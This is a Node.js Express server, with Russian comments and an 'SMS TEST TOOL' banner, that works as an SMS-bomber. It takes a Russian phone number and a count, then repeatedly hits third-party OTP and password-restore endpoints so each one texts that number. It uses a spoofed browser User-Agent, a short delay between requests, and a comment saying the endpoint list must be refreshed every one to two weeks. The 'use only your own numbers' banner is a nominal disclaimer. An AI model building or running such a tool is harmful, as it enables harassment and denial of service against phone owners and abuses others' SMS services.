const express = require('express');
const path = require('path');

const app = express();
const PORT = 3000;

// Раздаём статические файлы
app.use(express.static('public'));
app.use(express.json());

// API для отправки SMS
app.post('/api/send', async (req, res) => {
    const { phone, amount } = req.body;
    
    if (!phone || !amount) {
        return res.status(400).json({ error: 'Не указан номер или количество' });
    }
    
    // Очищаем номер: оставляем только цифры, убираем +, -, пробелы
    const cleanPhone = phone.replace(/\D/g, '');
    
    // Проверяем российский формат (11 цифр, начинается с 7 или 8)
    if (!(cleanPhone.length === 11 && (cleanPhone.startsWith('7') || cleanPhone.startsWith('8')))) {
        return res.status(400).json({ error: 'Неверный формат номера. Используйте 79001234567' });
    }
    
    console.log(`📱 Запрос для номера: ${cleanPhone}, количество: ${amount}`);
    
    // Список API для отправки (нужно обновлять каждые 1-2 недели)
    const apis = [
        { url: `https://restore.example.com/api/send?phone=${cleanPhone}`, method: 'GET' },
        { url: `https://otp.api.com/request?msisdn=${cleanPhone}`, method: 'POST' },
        // Добавьте актуальные API здесь
    ];
    
    let successCount = 0;
    let failCount = 0;
    
    // Отправляем запросы
    for (let i = 0; i < amount; i++) {
        try {
            const api = apis[i % apis.length];
            const response = await fetch(api.url, { 
                method: api.method,
                headers: { 'User-Agent': 'Mozilla/5.0' }
            });
            
            if (response.ok) successCount++;
            else failCount++;
        } catch (error) {
            failCount++;
        }
        
        // Задержка между запросами
        await new Promise(r => setTimeout(r, 100));
    }
    
    res.json({ 
        success: true, 
        sent: successCount, 
        failed: failCount,
        total: amount,
        message: `Отправлено ${successCount} из ${amount} запросов`
    });
});

// Запуск сервера
app.listen(PORT, () => {
    console.log(`
    ╔══════════════════════════════════════╗
    ║     SMS TEST TOOL - ГОТОВ К РАБОТЕ   ║
    ╠══════════════════════════════════════╣
    ║  🌐 Откройте в браузере:             ║
    ║     http://localhost:${PORT}          ║
    ║                                      ║
    ║  ⚠️  ИСПОЛЬЗУЙТЕ ТОЛЬКО СВОИ НОМЕРА  ║
    ╚══════════════════════════════════════╝
    `);
});
